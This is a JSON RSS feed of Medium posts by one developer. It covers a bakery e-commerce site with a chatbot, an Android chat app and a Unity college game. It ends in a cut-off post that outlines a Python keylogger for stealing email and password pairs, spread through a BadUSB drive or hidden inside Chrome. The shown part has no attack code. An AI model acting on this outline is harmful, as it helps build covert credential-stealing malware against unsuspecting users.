{"status":"ok","feed":{"url":"https://medium.com/feed/@@rajmehta2012","title":"Stories by Raj Mehta on Medium","link":"https://medium.com/@rajmehta2012?source=rss-d23e26fcbec3------2","author":"","description":"Stories by Raj Mehta on Medium","image":"https://cdn-images-1.medium.com/fit/c/150/150/0*-jHgYmE_njD672LA"},"items":[{"title":"CakeNBake\u200a\u2014\u200aECommerce Website + Chatbot","pubDate":"2021-01-09 06:14:45","link":"https://rajmehta2012.medium.com/cakenbake-ecommerce-website-chatbot-e5736c124e86?source=rss-d23e26fcbec3------2","guid":"https://medium.com/p/e5736c124e86","author":"Raj Mehta","thumbnail":"https://cdn-images-1.medium.com/max/805/1*k_DAG3FMaPDIGg9qSAIxbw.jpeg","description":"\n<h3>CakeNBake\u200a\u2014\u200aECommerce Website +\u00a0Chatbot</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*k_DAG3FMaPDIGg9qSAIxbw.jpeg\"></figure><p>Cake-N-Bake is a E-Commerce website which is launched because of a sales crisis due to the corona virus in 2020. It is an approach by a local bakery to expand their reach and to set their foot in the world of websites. Well the about story is just an imaginary situation where we a team of developers thought would be a scenario for a lot of local business so this is like a guide for anyone to create a e-commerce website along with a fully functional chatbot.</p>\n<p><strong>Technologies Used: \u2013</strong><br>\u2022 HTML5<br>\u2022 CSS<br>\u2022 PHP<br>\u2022 SQL<br>\u2022 JAVASCRIPT<br>\u2022 JQUERY<br>\u2022 BOOTSTRAP<br>\u2022 AJAX<br>\u2022\u00a0NODEJS</p>\n<p><strong>Modules Used:</strong><br>\u2022 Home Page<br>\u2022 Menu Page<br>\u2022 Offers Page<br>\u2022 About<br>\u2022 Contact Us<br>\u2022 Registration Page<br>\u2022 DB Connection<br>\u2022 Cart<br>\u2022 Checkout Page<br>\u2022 Payment Page<br>\u2022 Confirmation Page<br>\u2022 Feedback Page<br>\u2022 Layout\u00a0Page</p>\n<p><strong>NOTABLE FEATURES:</strong></p>\n<ol>\n<li>Captcha<br>Google reCAPTCHA was implemented to only allow legitimate users to\u00a0login.</li>\n<li>Secure login<br>Email and Password is used for authentication. However, the password is converted into a hash and saved in the database to assure\u00a0privacy.</li>\n<li>Payment gateway<br>Paytm payment gateway is an easy to integrate payment gateway. The payment amount is passed from the server to prevent amount manipulation on the client\u00a0side.</li>\n<li>Two-factor authentication<br>A random 5 digit code is sent on email to the user after he/she enters the correct password.</li>\n<li>SQL Injection and cross site scripting prevention<br>Each and every textbox has client side as well as server side validation to prevent only certain characters to be\u00a0stored.</li>\n<li>Hotlink Protection<br>Preventing pictures and other data on the server from being accessed by the outside\u00a0world.</li>\n<li>SSL Certificate<br>A SSL certificate from RapidSSL (verified by DigiCert has been installed)</li>\n</ol>\n<p><strong>CHATBOT: </strong><br>The CakeNBake chatbot is created in an AISL (Artificial Intelligence Scripting Language) called RiveScript. The brain code i.e the code that contains training dataset for the bot is then integrated with basic HTML, CSS and JS code. We have programmed the chatbot to make small talks also to remembers the things you inform the bot (like your favorite color or your name, the bot will remember it so one can ask it later). This makes the user experience very immersive. However apart from the small talk and other basic things, the bot is only trained to answer questions about the things related to website. Also, most importantly the bot resets itself after the session expires (i.e when u reload the\u00a0page).</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*y_e3uqgx0V_W3zVYTTXX9A.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*It_NBqpu5uUyiVurbPcd0g.png\"></figure><p><strong>HOME PAGE:</strong><br>A Slideshow with auto image change (in particular interval of time) for our latest bakery products. Also the home page has news about the offers and some items from our\u00a0menu.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/714/1*wWRfFnRv1NVXqXpy2eQPQQ.png\"></figure><p><strong>MENU PAGE</strong>: <br>Display all products that the bakery offers in this page.<br>There is also a feature to sort the items category-wise i.e- cake, chocolates, bread etc. We use \u2018ProductCode\u2019 field from the database and to sort it we use keyword \u2018like\u2019 in the SQL\u00a0Query.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*qNHV_Atpcdi8wUhe6_B1jA.png\"></figure><p><strong>OFFERS PAGE</strong>:<br>This Page showcases the latest offers that the bakery\u00a0offers.</p>\n<p><strong>ABOUT:</strong><br>About page gives the detailed information about the Bakery i.e the bakers, the location, the Timings for open and close\u00a0etc.</p>\n<p><strong>CONTACT US/ FEEEDBACK PAGE</strong>:<br>Here We mentioned our contact information and also most importantly the<br>feedback form is also available in this module. The feedback form helped us to\u00a0improve.</p>\n<p><strong>REGISTRATION</strong>:<br>Here the users can register their credentials. Registration is compulsory before checkout.</p>\n<p><strong>DATABASE CONNECTION</strong>:<br>This is a php file which contains code that connects the database to the\u00a0website.</p>\n<a href=\"https://medium.com/media/12c33e5c2e2ba122de252c549d6535cd/href\">https://medium.com/media/12c33e5c2e2ba122de252c549d6535cd/href</a><p><strong>VISIT SITE (CAKENBAKE): </strong><a href=\"https://cakenbakeofficial.000webhostapp.com/\"><strong>CLICK\u00a0HERE</strong></a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e5736c124e86\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<h3>CakeNBake\u200a\u2014\u200aECommerce Website +\u00a0Chatbot</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*k_DAG3FMaPDIGg9qSAIxbw.jpeg\"></figure><p>Cake-N-Bake is a E-Commerce website which is launched because of a sales crisis due to the corona virus in 2020. It is an approach by a local bakery to expand their reach and to set their foot in the world of websites. Well the about story is just an imaginary situation where we a team of developers thought would be a scenario for a lot of local business so this is like a guide for anyone to create a e-commerce website along with a fully functional chatbot.</p>\n<p><strong>Technologies Used: \u2013</strong><br>\u2022 HTML5<br>\u2022 CSS<br>\u2022 PHP<br>\u2022 SQL<br>\u2022 JAVASCRIPT<br>\u2022 JQUERY<br>\u2022 BOOTSTRAP<br>\u2022 AJAX<br>\u2022\u00a0NODEJS</p>\n<p><strong>Modules Used:</strong><br>\u2022 Home Page<br>\u2022 Menu Page<br>\u2022 Offers Page<br>\u2022 About<br>\u2022 Contact Us<br>\u2022 Registration Page<br>\u2022 DB Connection<br>\u2022 Cart<br>\u2022 Checkout Page<br>\u2022 Payment Page<br>\u2022 Confirmation Page<br>\u2022 Feedback Page<br>\u2022 Layout\u00a0Page</p>\n<p><strong>NOTABLE FEATURES:</strong></p>\n<ol>\n<li>Captcha<br>Google reCAPTCHA was implemented to only allow legitimate users to\u00a0login.</li>\n<li>Secure login<br>Email and Password is used for authentication. However, the password is converted into a hash and saved in the database to assure\u00a0privacy.</li>\n<li>Payment gateway<br>Paytm payment gateway is an easy to integrate payment gateway. The payment amount is passed from the server to prevent amount manipulation on the client\u00a0side.</li>\n<li>Two-factor authentication<br>A random 5 digit code is sent on email to the user after he/she enters the correct password.</li>\n<li>SQL Injection and cross site scripting prevention<br>Each and every textbox has client side as well as server side validation to prevent only certain characters to be\u00a0stored.</li>\n<li>Hotlink Protection<br>Preventing pictures and other data on the server from being accessed by the outside\u00a0world.</li>\n<li>SSL Certificate<br>A SSL certificate from RapidSSL (verified by DigiCert has been installed)</li>\n</ol>\n<p><strong>CHATBOT: </strong><br>The CakeNBake chatbot is created in an AISL (Artificial Intelligence Scripting Language) called RiveScript. The brain code i.e the code that contains training dataset for the bot is then integrated with basic HTML, CSS and JS code. We have programmed the chatbot to make small talks also to remembers the things you inform the bot (like your favorite color or your name, the bot will remember it so one can ask it later). This makes the user experience very immersive. However apart from the small talk and other basic things, the bot is only trained to answer questions about the things related to website. Also, most importantly the bot resets itself after the session expires (i.e when u reload the\u00a0page).</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*y_e3uqgx0V_W3zVYTTXX9A.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*It_NBqpu5uUyiVurbPcd0g.png\"></figure><p><strong>HOME PAGE:</strong><br>A Slideshow with auto image change (in particular interval of time) for our latest bakery products. Also the home page has news about the offers and some items from our\u00a0menu.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/714/1*wWRfFnRv1NVXqXpy2eQPQQ.png\"></figure><p><strong>MENU PAGE</strong>: <br>Display all products that the bakery offers in this page.<br>There is also a feature to sort the items category-wise i.e- cake, chocolates, bread etc. We use \u2018ProductCode\u2019 field from the database and to sort it we use keyword \u2018like\u2019 in the SQL\u00a0Query.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*qNHV_Atpcdi8wUhe6_B1jA.png\"></figure><p><strong>OFFERS PAGE</strong>:<br>This Page showcases the latest offers that the bakery\u00a0offers.</p>\n<p><strong>ABOUT:</strong><br>About page gives the detailed information about the Bakery i.e the bakers, the location, the Timings for open and close\u00a0etc.</p>\n<p><strong>CONTACT US/ FEEEDBACK PAGE</strong>:<br>Here We mentioned our contact information and also most importantly the<br>feedback form is also available in this module. The feedback form helped us to\u00a0improve.</p>\n<p><strong>REGISTRATION</strong>:<br>Here the users can register their credentials. Registration is compulsory before checkout.</p>\n<p><strong>DATABASE CONNECTION</strong>:<br>This is a php file which contains code that connects the database to the\u00a0website.</p>\n<a href=\"https://medium.com/media/12c33e5c2e2ba122de252c549d6535cd/href\">https://medium.com/media/12c33e5c2e2ba122de252c549d6535cd/href</a><p><strong>VISIT SITE (CAKENBAKE): </strong><a href=\"https://cakenbakeofficial.000webhostapp.com/\"><strong>CLICK\u00a0HERE</strong></a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e5736c124e86\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["ecommerce","chatbot-development","website-development","ecommerce-website-design","ecommerce-web-development"]},{"title":"CHITCHAT- Chatting Application","pubDate":"2021-01-09 06:07:45","link":"https://rajmehta2012.medium.com/chitchat-chatting-application-e3dc58bfbcf4?source=rss-d23e26fcbec3------2","guid":"https://medium.com/p/e3dc58bfbcf4","author":"Raj Mehta","thumbnail":"https://cdn-images-1.medium.com/max/805/1*oUvJ6Ercbvlj-eVygRWGzg.png","description":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*oUvJ6Ercbvlj-eVygRWGzg.png\"></figure><p>Back in late 2019 there were lot of rumors about data leaks in a lot of social media platforms like Facebook, Whatsapp, Instagram etc\u2026..this made me think what if I have my own version of whatsapp and thats what exactly this app is about, my own chatting application\u00a0!!</p>\n<p>ChitChat is developed in Java programming language with Android studio as IDE. Since it was just a small fun project with limited number of users it made us more sense to use service like firebase for data encryption, authentication and storing data like profile pics\u00a0etc.</p>\n<p>The chat messages are end-to-end encrypted. The working is something like this: 1) There is a random hexadecimal string generated for each chat convesration (Eg: qxter1234ncfywd3eqw1b is random token generated for conversation between user A and B) now further this chat may have sub-tokens for each chat message. This sub-token contains important information like the content i.e the message/chat itself, date and time. All these hexadecimal tokens are similar to digest tokens. In simple words they are one-way hashed tokens. Similarly since I didn\u2019t want users to view full-sized profile pic without permission hence similar token also save information about image location.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/891/1*Zf6JpEZBklSlbwXux-w8Nw.jpeg\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*B6PYt7zzRKJJT0Qmxnt2Ag.jpeg\"></figure><p><strong>Download/View Code\u00a0: </strong><a href=\"https://github.com/Raj-Mehta2012/ChitChat_ChattingApp\"><strong>Click\u00a0Here</strong></a></p>\n<blockquote>NOTE: Using code/images for commercial purposes without permission may subject to copyright.</blockquote>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e3dc58bfbcf4\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*oUvJ6Ercbvlj-eVygRWGzg.png\"></figure><p>Back in late 2019 there were lot of rumors about data leaks in a lot of social media platforms like Facebook, Whatsapp, Instagram etc\u2026..this made me think what if I have my own version of whatsapp and thats what exactly this app is about, my own chatting application\u00a0!!</p>\n<p>ChitChat is developed in Java programming language with Android studio as IDE. Since it was just a small fun project with limited number of users it made us more sense to use service like firebase for data encryption, authentication and storing data like profile pics\u00a0etc.</p>\n<p>The chat messages are end-to-end encrypted. The working is something like this: 1) There is a random hexadecimal string generated for each chat convesration (Eg: qxter1234ncfywd3eqw1b is random token generated for conversation between user A and B) now further this chat may have sub-tokens for each chat message. This sub-token contains important information like the content i.e the message/chat itself, date and time. All these hexadecimal tokens are similar to digest tokens. In simple words they are one-way hashed tokens. Similarly since I didn\u2019t want users to view full-sized profile pic without permission hence similar token also save information about image location.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/891/1*Zf6JpEZBklSlbwXux-w8Nw.jpeg\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*B6PYt7zzRKJJT0Qmxnt2Ag.jpeg\"></figure><p><strong>Download/View Code\u00a0: </strong><a href=\"https://github.com/Raj-Mehta2012/ChitChat_ChattingApp\"><strong>Click\u00a0Here</strong></a></p>\n<blockquote>NOTE: Using code/images for commercial purposes without permission may subject to copyright.</blockquote>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e3dc58bfbcf4\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["android-app-development","chatting-application","raj-mehta","android-studio"]},{"title":"Xavier\u2019s Unleashed\u200a\u2014\u200aUnity 3D Game","pubDate":"2021-01-09 05:48:34","link":"https://rajmehta2012.medium.com/xaviers-unleashed-unity-3d-game-b21e02fba811?source=rss-d23e26fcbec3------2","guid":"https://medium.com/p/b21e02fba811","author":"Raj Mehta","thumbnail":"https://cdn-images-1.medium.com/max/805/1*kJij5-kbIUIMAFL8BP_r5Q.jpeg","description":"\n<h3>Xavier\u2019s Unleashed\u200a\u2014\u200aUnity 3D\u00a0Game</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*kJij5-kbIUIMAFL8BP_r5Q.jpeg\"></figure><p>I excitedly picked up my Samsung Guru mobile, launched \u201cSherlock Homes\u201d the game and started playing it as though it was the best game ever. It was amazing, we had to go into these various rooms, pick up clues that would come into play later on in the course of the game and complete tasks\u2026 Oh! I almost forgot to mention that the game was in 2D. Anyways, that was long ago in 2011. Fast forward 8 years, and now we have \u201cCall of Duty\u201d, \u201cFIFA\u201d, \u201cPES\u201d and many more such games available on a smartphone. This is as exciting as it could get (well, at least for now), being able to play them anytime, anywhere and with anyone is practically a huge advancement in the field of Technology.</p>\n<p>My interest in the field of Game Development emerged when we were asked to make a project for a subject called \u201cGraphic Designing\u201d wherein 3 of my friends (Aaron\u00a0,Tanmay, Jigar) and I came together to make a real-life 3D game. Given that my entire friend circle was into computer and mobile games we pretty much had an idea of what the game should look like. However, we were searching for a great idea and a great storyline for the game (which are the two building blocks of any game). So, after much deliberation and a series of brainstorming sessions we came up with the following idea: \u2018What if we created an open world game wherein the map would be our own prestigious college \u2013<strong>St. Xaviers College Mumbai</strong>\u2019, we would have the student (our player) perform various tasks to get points. In order to acquire these points, the player would have to visit each department and then answer academic questions as per the respective department and receive points, if the answer was correct. On reaching the score limit, that player would then complete the game (yes, it does pretty much sound like a GTA rip off, however the goal was to incorporate a real-life 3D model of our college in the game along with regular college\u00a0tasks).</p>\n<p>Now that we had our idea and storyline in place, we had to start the next phase, which would include determining the software needed for bringing this abstract idea to life. After doing a lot of research and reading various types software available for game development, we as a whole, decided to settle down on using Unity, Visual Studio (used by Unity) and Blender. Now, what are all these weird names which we have never heard before? Well, Blender is an application wherein we would design the map that was required, all the 3D models would be designed and then \u201ctransported\u201d to Unity. What is Unity? Unity is a Game Engine that allows you to make games! It provides various tools to the developer to make their game stunning and exciting. So then, what does Visual Studio do? Visual Studio is a code editor (Integrated Development Environment or IDE) wherein we decide how our character moves, runs, jumps etc. so in essence, the entire functionality of our character or the behavior of our character would go into Visual\u00a0Studio.</p>\n<p>It is important to understand that game development isn\u2019t hard to understand nor is it rocket science. It is just \u201cyou\u201d telling the game engine how your \u201cplayer\u201d should behave in the game. Let us take a simple example, now since we are making a 3D game, we have to understand that we will be dealing with 3 dimensions as 3D means 3 Dimensional. These dimensions would be the X, Y and Z\u00a0planes.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*DrtoGmsShkYenY9skAFYdw.png\"></figure><p>In the window on the left at the top right corner, we see the 3 dimensions in which the green signifies the Y-axis, blue signifies the Z-axis and red signifies the X-axis. At this stage we have made a simple ground for our player to move on. Notice how the camera catches everything that is specified in its given range. We can alter the camera and also change its position to fit our desire. Next, we create our player which will be another cube that should move on this\u00a0ground..</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*iOIHBCFnTRVfAlJQCohHXw.png\"></figure><p>As we see in the image above, we have created our player that will now move on the ground (notice the Rigidbody property of our player on the last right-hand window). However, the player won\u2019t move automatically as soon as we hit the play button situated at the top of the two windows. Here is where Visual Studio comes into play. We now will specify what our player does once the game\u00a0starts</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Q9qxIv6Eimnz2TjTcOtgXQ.png\"></figure><p>Now as soon as we make a new script for our player we are greeted automatically with this screen. Don\u2019t pay heed to what is written from lines 1\u20138, but focus on the two main functions:\u200a\u2014\u200a\u201cvoid Start()\u201d and \u201cvoid FixedUpdate()\u201d. The \u201cvoid Start()\u201d function gets called only once at the very beginning of the game and never gets called after that, however on the other hand, the function \u201cvoid FixedUpdate()\u201d gets called every time your computer screen refreshes. So, logically speaking, if we wanted to make our player move, then that entire code will go into the \u201cvoid FixedUpdate()\u201d function. By writing the following piece of code it will apply force to our player in the forward direction once we hit the play\u00a0button\u2026.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*p1FRbCpRTfmPNTltWsMp1A.png\"></figure><p>On line 7 we declare a variable <strong>\u201crb\u201d</strong>of type <strong>Rigidbody</strong> so that we can now reference our player through code(recall that our player had a property of rigidbody)! As of now we can control our player by writing just a few lines of code and making it do what we want. So, on line 18, we have used a function named \u201cAddForce()\u201d which will add force on our player (<strong>rb</strong>) in the X, Y and Z direction once we run the\u00a0game.</p>\n<p>However, if you want to only move your player forward then you would need to write something like\u00a0this\u2026</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*NVA5XwXHtTprfSqGrbhunw.png\"></figure><p>On line 18, we now check if the key \u2018W\u2019 is pressed on the keyboard, if so, only then will the force be added to our\u00a0player!</p>\n<p>The above example shows how we can make a player and also how we can write a simple piece of code to move the player around on pressing the desired key. There are so many other things that one can do to leverage the entire power of Unity and make a stunning\u00a0game.</p>\n<p>Overall, there are loads of stuff that one can figure out and do once you set foot into game development. The game that my friends and I built is called \u201cXaviers Unleashed\u201d and does contain such pieces of code for our player movement, below are a couple of screenshots of the fully functioning game along with how the entire college quad was designed in Blender. For getting the texture of the buildings of our college while designing, we used a DSLR camera to click pictures of the walls of our college and then applied that to our 3D\u00a0model.</p>\n<p>DESIGN:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*cxh32N5e6LWg04ZYhYt0Mw.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/991/1*ByOSEd6qF9McDxNYMei4mQ.png\"></figure><p>TEXTURES:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*cmChs7YJC6LfkUzKp5COcw.png\"></figure><p>WIREFRAME:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*vfjlCnfDc1kzb18qqHAWJw.png\"></figure><p>GAMEPLAY:</p>\n<a href=\"https://medium.com/media/a54a102b825e3666552742b1e758cba8/href\">https://medium.com/media/a54a102b825e3666552742b1e758cba8/href</a><img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=b21e02fba811\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<h3>Xavier\u2019s Unleashed\u200a\u2014\u200aUnity 3D\u00a0Game</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*kJij5-kbIUIMAFL8BP_r5Q.jpeg\"></figure><p>I excitedly picked up my Samsung Guru mobile, launched \u201cSherlock Homes\u201d the game and started playing it as though it was the best game ever. It was amazing, we had to go into these various rooms, pick up clues that would come into play later on in the course of the game and complete tasks\u2026 Oh! I almost forgot to mention that the game was in 2D. Anyways, that was long ago in 2011. Fast forward 8 years, and now we have \u201cCall of Duty\u201d, \u201cFIFA\u201d, \u201cPES\u201d and many more such games available on a smartphone. This is as exciting as it could get (well, at least for now), being able to play them anytime, anywhere and with anyone is practically a huge advancement in the field of Technology.</p>\n<p>My interest in the field of Game Development emerged when we were asked to make a project for a subject called \u201cGraphic Designing\u201d wherein 3 of my friends (Aaron\u00a0,Tanmay, Jigar) and I came together to make a real-life 3D game. Given that my entire friend circle was into computer and mobile games we pretty much had an idea of what the game should look like. However, we were searching for a great idea and a great storyline for the game (which are the two building blocks of any game). So, after much deliberation and a series of brainstorming sessions we came up with the following idea: \u2018What if we created an open world game wherein the map would be our own prestigious college \u2013<strong>St. Xaviers College Mumbai</strong>\u2019, we would have the student (our player) perform various tasks to get points. In order to acquire these points, the player would have to visit each department and then answer academic questions as per the respective department and receive points, if the answer was correct. On reaching the score limit, that player would then complete the game (yes, it does pretty much sound like a GTA rip off, however the goal was to incorporate a real-life 3D model of our college in the game along with regular college\u00a0tasks).</p>\n<p>Now that we had our idea and storyline in place, we had to start the next phase, which would include determining the software needed for bringing this abstract idea to life. After doing a lot of research and reading various types software available for game development, we as a whole, decided to settle down on using Unity, Visual Studio (used by Unity) and Blender. Now, what are all these weird names which we have never heard before? Well, Blender is an application wherein we would design the map that was required, all the 3D models would be designed and then \u201ctransported\u201d to Unity. What is Unity? Unity is a Game Engine that allows you to make games! It provides various tools to the developer to make their game stunning and exciting. So then, what does Visual Studio do? Visual Studio is a code editor (Integrated Development Environment or IDE) wherein we decide how our character moves, runs, jumps etc. so in essence, the entire functionality of our character or the behavior of our character would go into Visual\u00a0Studio.</p>\n<p>It is important to understand that game development isn\u2019t hard to understand nor is it rocket science. It is just \u201cyou\u201d telling the game engine how your \u201cplayer\u201d should behave in the game. Let us take a simple example, now since we are making a 3D game, we have to understand that we will be dealing with 3 dimensions as 3D means 3 Dimensional. These dimensions would be the X, Y and Z\u00a0planes.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*DrtoGmsShkYenY9skAFYdw.png\"></figure><p>In the window on the left at the top right corner, we see the 3 dimensions in which the green signifies the Y-axis, blue signifies the Z-axis and red signifies the X-axis. At this stage we have made a simple ground for our player to move on. Notice how the camera catches everything that is specified in its given range. We can alter the camera and also change its position to fit our desire. Next, we create our player which will be another cube that should move on this\u00a0ground..</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*iOIHBCFnTRVfAlJQCohHXw.png\"></figure><p>As we see in the image above, we have created our player that will now move on the ground (notice the Rigidbody property of our player on the last right-hand window). However, the player won\u2019t move automatically as soon as we hit the play button situated at the top of the two windows. Here is where Visual Studio comes into play. We now will specify what our player does once the game\u00a0starts</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Q9qxIv6Eimnz2TjTcOtgXQ.png\"></figure><p>Now as soon as we make a new script for our player we are greeted automatically with this screen. Don\u2019t pay heed to what is written from lines 1\u20138, but focus on the two main functions:\u200a\u2014\u200a\u201cvoid Start()\u201d and \u201cvoid FixedUpdate()\u201d. The \u201cvoid Start()\u201d function gets called only once at the very beginning of the game and never gets called after that, however on the other hand, the function \u201cvoid FixedUpdate()\u201d gets called every time your computer screen refreshes. So, logically speaking, if we wanted to make our player move, then that entire code will go into the \u201cvoid FixedUpdate()\u201d function. By writing the following piece of code it will apply force to our player in the forward direction once we hit the play\u00a0button\u2026.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*p1FRbCpRTfmPNTltWsMp1A.png\"></figure><p>On line 7 we declare a variable <strong>\u201crb\u201d</strong>of type <strong>Rigidbody</strong> so that we can now reference our player through code(recall that our player had a property of rigidbody)! As of now we can control our player by writing just a few lines of code and making it do what we want. So, on line 18, we have used a function named \u201cAddForce()\u201d which will add force on our player (<strong>rb</strong>) in the X, Y and Z direction once we run the\u00a0game.</p>\n<p>However, if you want to only move your player forward then you would need to write something like\u00a0this\u2026</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*NVA5XwXHtTprfSqGrbhunw.png\"></figure><p>On line 18, we now check if the key \u2018W\u2019 is pressed on the keyboard, if so, only then will the force be added to our\u00a0player!</p>\n<p>The above example shows how we can make a player and also how we can write a simple piece of code to move the player around on pressing the desired key. There are so many other things that one can do to leverage the entire power of Unity and make a stunning\u00a0game.</p>\n<p>Overall, there are loads of stuff that one can figure out and do once you set foot into game development. The game that my friends and I built is called \u201cXaviers Unleashed\u201d and does contain such pieces of code for our player movement, below are a couple of screenshots of the fully functioning game along with how the entire college quad was designed in Blender. For getting the texture of the buildings of our college while designing, we used a DSLR camera to click pictures of the walls of our college and then applied that to our 3D\u00a0model.</p>\n<p>DESIGN:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*cxh32N5e6LWg04ZYhYt0Mw.png\"></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/991/1*ByOSEd6qF9McDxNYMei4mQ.png\"></figure><p>TEXTURES:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*cmChs7YJC6LfkUzKp5COcw.png\"></figure><p>WIREFRAME:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*vfjlCnfDc1kzb18qqHAWJw.png\"></figure><p>GAMEPLAY:</p>\n<a href=\"https://medium.com/media/a54a102b825e3666552742b1e758cba8/href\">https://medium.com/media/a54a102b825e3666552742b1e758cba8/href</a><img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=b21e02fba811\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["programming","st-xaviers-college","game-development","c-sharp-programming","unity-game-development"]},{"title":"INTRODUCTION\u00a0:","pubDate":"2021-01-06 14:59:26","link":"https://rajmehta2012.medium.com/introduction-274b4f4f6724?source=rss-d23e26fcbec3------2","guid":"https://medium.com/p/274b4f4f6724","author":"Raj Mehta","thumbnail":"https://cdn-images-1.medium.com/max/805/1*NSBAVM0oG1Lqkx_Ewrkg8A.jpeg","description":"\n<h3>PythonKeylogger- BadUSB + ChromeVirus</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/805/1*NSBAVM0oG1Lqkx_Ewrkg8A.jpeg\"></figure><p>This program is used to record email id and password combinations so that the hacker could easily exploit the data.<br>Keylogger- A Keylogger is a program that records activity of the target. In simple words Keylogger program records all the keys pressed on keyboard. Not only does it record keys from the physical keyboard but also from virtual/on-screen keyboards.<br>Bad USB- Bad USB is a physical pendrive when plugged in executes some malware files/program. Here we are executing our keylogger file on USB plugin.<br>Virus- A program that when executed makes modifies or read some files without the user knowing is called virus. Here we are going to attach our virus file (i.e Keylogger) to chrome application so when chrome is executed the virus also executes in the background.</p>\n<p><strong>WHY MAKE THIS / REAL-LIFE IMPLEMENTATION\u00a0:</strong></p>\n<p>Since in the so called 21st century almost all life tasks are carried on digitally. However it hasn\u2019t been more simpler for a hacker to exploit users. It is very important to spread awareness about one of the method of data stealing.</p>\n<p><strong>TECHNOLOGY USED\u00a0:</strong></p>\n<p>Python, Portable Python (PyWin32/ PyWin64), Visual Basic Scripting, Socket Programming, USB\u00a0device.</p>\n<p><strong>PROCEDURE\u00a0:</strong></p>\n<p>We first code a keylogger file in Python. Once the keylogger program is created we have two<br>implementation methods\u200a\u2014\u200a1) Hardware Access 2) Software\u00a0Access</p>\n<p>1) Hardware Access\u200a\u2014\u200aIn this method of implementation we require a physical hardware device. In this case we need a USB\u00a0drive.</p>\n<p>2) Software Access-\u200a\u2014\u200aIn this method of implementation we will not require a physical hardware device, we can attach our virus to any program/application.</p>\n<p>Keylogger Program- To create a keylogger program we need to install python firstly. An external library \u201cPynput\u201d is required to record keystrokes. Pynput can be installed just by running command prompt as administrator and pasting a command\u00a0: <strong><em>pip3 install\u00a0pynput</em></strong></p>\n<p><strong>INTRODUCTION\u00a0:</strong></p>\n<p>This program is used to record email id and password combinations so that the hacker could easily exploit the data.<br>Keylogger- A Keylogger is a program that records activity of the target. In simple words Keylogger program records all the keys pressed on keyboard. Not only does it record keys from the physical keyboard but also from virtual/on-screen keyboards.<br>Bad USB- Bad USB is a physical pendrive when plugged in executes some malware files/program. Here we are executing our keylogger file on USB plugin.<br>Virus- A program that when executed makes modifies or read some files without the user knowing is called virus. Here we are going to attach our virus file (i.e Keylogger) to chrome application so when chrome is executed the virus also executes in the background.</p>\n<p><strong>WHY MAKE THIS / REAL-LIFE IMPLEMENTATION\u00a0:</strong></p>\n<p>Since in the so called 21st century almost all life tasks are carried on digitally. However it hasn\u2019t been more simpler for a hacker to exploit users. It is very important to spread awareness about one of the method of data stealing.</p>\n<p><strong>TECHNOLOGY USED\u00a0:</strong></p>\n<p>Python, Portable Python (PyWin32/ PyWin64), Visual Basic Scripting, Socket Programming, USB\u00a0device.</p>\n<p><strong>PROCEDURE\u00a0:</strong></p>\n<p>We first code a keylogger file in Python. Once the 